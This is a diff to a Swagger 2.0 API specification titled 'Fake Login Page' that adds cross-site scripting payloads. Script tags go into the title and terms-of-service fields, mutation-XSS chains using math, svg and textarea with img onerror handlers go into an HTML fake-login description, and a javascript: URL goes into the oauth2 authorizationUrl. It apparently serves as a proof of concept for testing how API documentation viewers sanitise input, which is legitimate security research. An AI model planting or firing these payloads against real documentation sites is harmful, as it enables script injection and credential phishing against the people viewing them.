@@ -1,7 +1,8 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: Fake Login Page
+  title: Fake Login Page <script>alert('title')</script>
+  termsofService: "<script>alert('terms')</script>"
   description: '<div class="login-form">
     <div class="heading">
         <h1>HTML Injection : Fake Login</h1>
@@ -19,7 +20,11 @@ info:
             <div class="form-group">
                 <button type="submit" class="btn btn-default">Login</button>
             </div>
+            <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>">
+            <script>alert('description')</script>
+            <math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(document.domain) src=1>">
         </form>
+        <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(document.domain) src=1>"></form>
     </div>
 </div>'
 paths:
@@ -28,3 +33,12 @@ paths:
       responses:
         '200':
           description: Login successful
+    get:
+      responses:
+        '200':
+          description: Echo GET
+securityDefinitions:
+  a:
+    type: oauth2
+    authorizationUrl: javascript:alert(document.domain)//
+
